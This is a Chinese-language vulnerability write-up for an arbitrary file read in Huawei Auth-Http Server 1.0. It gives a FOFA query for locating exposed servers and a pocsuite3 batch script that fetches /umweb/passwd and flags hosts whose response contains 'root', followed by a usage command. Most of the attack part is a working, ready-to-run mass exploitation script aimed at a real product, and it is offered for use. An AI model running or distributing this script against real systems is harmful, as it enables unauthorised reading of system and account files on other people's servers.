漏洞简介

华为Auth-Http Server 1.0 存在任意文件读取漏洞，攻击者可通过该漏洞读取任意文件。

漏洞复现

1.使用下面fofa语句进行资产收集，确认测试目标

```
fofa语句server="Huawei Auth-Http Server 1.0"
```

2.使用burp工具进行抓包，接着构造命令执行请求包，查看响应的内容

![](C:/Users/30842/Documents/WeChat%20Files/wxid_vtymv0eo2nta22/FileStorage/Temp/e4243fcb596d22ffdcd1be8a6d5afa4d.png)

**批量脚本**

```YAML

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class enjoyIT1(POCBase):
    pocDesc = ''' 华为Auth-http Server任意文件读取漏洞 '''
    vulID = '1'
    version = '1.0'
    author = '公众号揽月安全团队'
    vulDate = '2023-11-27'
    createDate = '2023-11-27'
    updateDate = '2023-11-27'
    name = '华为Auth-http Server任意文件读取漏洞 '
    appName = '华为Auth-http Server'



    def _verify(self):

        result = {}
        path = "/umweb/passwd"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        url = self.url + path
        payload = '/umweb/passwd'

        try:
            response = requests.get(url, headers=headers,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(enjoyIT1)
```

使用语法： pocsuite -r Huawei-Auth-http-server -u http:*//x.x.x.x*